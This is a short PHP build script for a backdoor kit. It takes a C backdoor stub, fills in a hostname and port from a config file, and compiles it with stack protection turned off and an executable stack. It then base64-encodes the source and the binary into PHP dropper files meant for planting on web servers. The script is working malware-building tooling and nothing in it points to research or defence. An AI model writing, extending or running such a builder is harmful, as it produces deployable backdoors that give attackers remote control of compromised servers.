<?php
include("./config.php");

//Cleanup

@system("rm -rf ./build; mkdir ./build");

// Read C stub

$stub_c = file_get_contents("./stub/backdoor.c");

// Inject settings

$c = str_replace("{hostname}", $host, $stub_c);
$c = str_replace("{port}", $port, $c);

// Write C backdoor

file_put_contents("./build/backdoor.c", $c);

// Compile C backdoor

system("gcc -g -Wall -fno-stack-protector -z execstack ./build/backdoor.c -o ./build/backdoor");

// Read PHP stub

$stub_php_c = file_get_contents("./stub/backdoor_c.php");

// Inject C backdoor code into 

$php_c = str_replace("{source}", base64_encode($c), $stub_php_c);

// Write php backdoor

file_put_contents("./build/backdoor_c.php", $php_c);

// Read native backdoor

$bin = file_get_contents("./build/backdoor");

// Read PHP stub for native backdoor

$stub_php_bin = file_get_contents("./stub/backdoor_bin.php");

// Inject native backdoor into PHP

$php_bin = str_replace("{bin}", base64_encode($bin), $stub_php_bin);

// Write down PHP with native backdoor

file_put_contents("./build/backdoor_bin.php", $php_bin);
